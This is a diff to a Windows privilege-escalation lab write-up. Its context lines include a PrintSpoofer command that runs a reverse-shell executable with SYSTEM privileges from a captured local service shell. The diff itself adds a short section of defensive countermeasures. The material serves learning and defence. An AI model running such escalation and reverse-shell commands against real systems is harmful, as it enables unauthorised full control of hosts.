@@ -325,3 +325,7 @@ And in the `local service` reverse shell triggered, run the PrintSpoofer exploit
 running with `SYSTEM` privileges (update the IP address with your Kali IP accordingly):
 
     C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
+
+## Counter moves
+
+This room surveys Windows escalation paths from one foothold. Least privilege, service hardening, and removing standing admin address them together. The defensive counterpart is in the blue notes on [the gap between access and authority](https://blue.tymyrddin.dev/docs/counter/escalation/).
